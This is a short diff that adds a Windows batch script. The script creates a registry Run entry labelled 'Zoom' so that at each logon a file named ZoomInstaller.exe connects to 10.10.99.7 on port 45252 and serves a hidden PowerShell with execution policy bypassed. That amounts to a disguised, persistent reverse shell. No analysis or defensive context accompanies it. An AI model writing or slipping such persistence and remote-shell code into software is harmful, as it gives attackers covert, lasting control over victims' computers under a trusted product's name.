@@ -1,0 +1,2 @@
+@echo off
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Zoom /t REG_SZ /d "%APPDATA%\ZoomInstaller.exe 10.10.99.7 45252 -e \"%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile -windowstyle hidden\"" 2>&1
